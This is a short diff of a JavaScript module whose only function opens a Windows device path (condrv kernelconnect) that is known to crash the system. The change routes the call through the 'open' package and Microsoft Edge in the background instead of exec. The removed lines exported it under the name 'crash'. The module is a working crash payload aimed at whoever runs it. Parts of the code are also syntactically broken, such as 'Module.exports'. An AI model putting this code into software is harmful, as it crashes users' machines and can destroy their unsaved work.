@@ -1,9 +1,7 @@
-const { exec } = require('child_process')
+const open = require('open');
 
 function oopsydaisy() {
-    exec('start "" \\\\.\\globalroot\\device\\condrv\\kernelconnect');
+    open('\\\\.\\globalroot\\device\\condrv\\kernelconnect', { background: true, app: 'msedge' });
 }
 
-Module.exports = {
-    crash=oopsydaisy
-}
+Module.exports = oopsydaisy
